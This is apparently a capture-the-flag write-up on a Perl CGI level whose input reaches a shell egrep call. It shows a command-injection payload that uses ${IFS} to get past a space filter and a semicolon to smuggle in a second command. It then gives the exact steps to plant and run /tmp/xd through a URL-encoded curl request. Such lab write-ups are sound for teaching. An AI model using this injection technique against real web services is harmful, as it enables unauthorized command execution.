quick code analysis:
	shell execution at "@output = ... "

	egrep "^$xx" /tmp/xd 2>&1
	
	$xx is under user control
	
	$xx is filtered:
		$xx =~ tr/a-z/A-Z, lowercase is replaced with uppercase (no commands to execute)
		$xx =~ tr/\s.*//, everything after the first space is ignored

injection:
	code:
		"${IFS}-V${IFS};A="

	after expansion:
		egrep "^"${IFS}-V${IFS};A="" /tmp/xd 2>&1	
		${IFS} is equivalent to space -> space filter bypass
	
	"${IFS}-V${IFS}; to disable grep listening
	A=" to get rid of the last quote

	this will execute /tmp/xd which is under attacker control

/tmp/xd source:
	getflag > /tmp/flagresult

running the attack:

	$ echo "getflag > /tmp/flagresult" > /tmp/xd
	$ chmod 777 /tmp/xd
	$ curl 127.0.0.1:4646/?x=%22%24%7BIFS%7D-V%24%7BIFS%7D%3BA%3D%22
	$ cat /tmp/flagresult
